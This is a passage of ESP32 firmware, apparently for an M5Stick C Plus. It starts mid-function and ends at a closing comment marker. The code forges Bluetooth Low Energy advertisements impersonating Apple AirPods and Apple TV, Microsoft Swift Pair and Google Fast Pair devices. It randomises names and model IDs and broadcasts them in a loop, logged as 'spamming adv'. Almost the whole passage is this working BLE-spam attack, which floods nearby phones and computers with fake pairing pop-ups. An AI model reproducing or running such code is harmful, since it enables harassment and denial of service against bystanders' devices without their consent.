        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
        packet[i++] = types[rand() % sizeof(types)];  // Action Type
        esp_fill_random(&packet[i], 3); // Authentication Tag
        i += 3;
        packet[i++] = 0x00;  // ???
        packet[i++] = 0x00;  // ???
        packet[i++] =  0x10;  // Type ???
        esp_fill_random(&packet[i], 3);
        oAdvertisementData.addData(std::string((char *)packet, 17));
        count++;
        for (int i = 0; i < sizeof packet; i ++) {
          Serial.printf("%02x", packet[i]);
        }
      } else if (swiftPair) {
        const char* display_name = generateRandomName();
        Serial.printf(display_name);
        uint8_t display_name_len = strlen(display_name);
        uint8_t size = 7 + display_name_len;
        uint8_t* packet = (uint8_t*)malloc(size);
        uint8_t i = 0;
        packet[i++] = size - 1; // Size
        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
        packet[i++] = 0x06; // Company ID (Microsoft)
        packet[i++] = 0x00; // ...
        packet[i++] = 0x03; // Microsoft Beacon ID
        packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
        packet[i++] = 0x80; // Reserved RSSI Byte
        for (int j = 0; j < display_name_len; j++) {
          packet[i + j] = display_name[j];
        }
        for (int i = 0; i < size; i ++) {
          Serial.printf("%02x", packet[i]);
        }
        Serial.println("");

        i += display_name_len;  
        oAdvertisementData.addData(std::string((char *)packet, size));
        count++;
        free(packet);
        free((void*)display_name);
      } else if (androidPair) {
        Serial.print("spamming adv");
        uint8_t packet[14];
        uint8_t i = 0;
        packet[i++] = 3;  // Packet Length
        packet[i++] = 0x03; // AD Type (Service UUID List)
        packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
        packet[i++] = 0xFE; // ...
        packet[i++] = 6; // Size
        packet[i++] = 0x16; // AD Type (Service Data)
        packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
        packet[i++] = 0xFE; // ...
        const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
        packet[i++] = (model >> 0x10) & 0xFF;
        packet[i++] = (model >> 0x08) & 0xFF;
        packet[i++] = (model >> 0x00) & 0xFF;
        packet[i++] = 2; // Size
        packet[i++] = 0x0A; // AD Type (Tx Power Level)
        packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

        oAdvertisementData.addData(std::string((char *)packet, 14));
        count++;
        for (int i = 0; i < sizeof packet; i ++) {
          Serial.printf("%02x", packet[i]);
        }
        Serial.println("");
      } else {
        Serial.print("ADV");
        if (deviceType >= 18){
          oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
          count++;
        } else {
          oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
          count++;
        }
        for (int i = 0; i < sizeof(Airpods); i ++) {
          Serial.printf("%02x", data[i]);
        }      
        Serial.println("");
      }
      
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->start();
      delay(100);
  #if defined(LED)
      digitalWrite(LED, LED_ON); //LED ON on Stick C Plus
      delay(10);
      digitalWrite(LED, LED_OFF); //LED OFF on Stick C Plus
  #endif

      
      tft.setCursor(0,0);
      tft.setTextColor(TFT_WHITE, BGCOLOR);
      tft.setTextSize(2);
      tft.print("Packets: " + String(count) + "/s");
      count=0;
      tmp=millis();

      pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
      BLEDevice::deinit();

    }
    // Checks para sair do while
    if(checkEscPress()) break;
  }
  pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
  BLEDevice::deinit();
  delay(200);
  tft.fillScreen(TFT_BLACK);
  returnToMenu=true;
}

*/